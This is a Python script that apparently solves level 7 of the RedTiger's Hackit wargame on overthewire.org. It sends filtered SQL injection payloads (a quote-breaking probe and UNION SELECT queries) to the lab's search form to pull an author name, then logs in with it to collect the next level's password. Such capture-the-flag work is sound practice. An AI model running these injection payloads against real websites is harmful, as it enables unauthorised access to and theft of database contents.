#!/usr/bin/env python3
#import pickle
import tigers as tg
import tiger_cookies
from connect import my_request as req


def main():
    '''
    Hard Error Based Sqli with filtering

    Target: Get the name of the user who posted the news about google. 
    Table: level7_news column: autor

    Restrictions: no comments, no substr, no substring, no ascii, no mid, no like
    '''
    url = "https://redtiger.labs.overthewire.org/level7.php"
    table_name = 'level7_news'
    finds = ['autor']  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level7login'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level7login=cooks[level])

    # Search for error
    data = dict(search="google%'", dosearch='search!')
    response = req.post_request(url, data, cook)

    # Counting the number of columns
    payload = f"google%%') union select %s FROM {table_name} news, level7_texts text where ('%%'='"
    data = dict(search=payload, dosearch='search!')
    if not (columns := tg.count_columns(url, data, cook, method='post', sqli='union')):
        return False

    # Search for visible columns and desired data
    payload = f"google%%') UNION SELECT %s FROM {table_name} news, level7_texts text where ('%%'='"
    data = dict(search=payload, dosearch='search!')
    if not (keys := tg.find_visible_columns_and_param(url, columns, data, finds, cook, method='post')):
        return False

    # ToDo one key upper, need to find all keys and test they
    keys.append('TestUserforg00gle')
    # Authorization
    for k in keys:
        data = {'username': k, 'try': 'Check!'}
        response = req.post_request(url, data, cook)
        if 'flag' in response:
            # Еxtracting data from html
            passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
            print('password:', passw)
            tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()





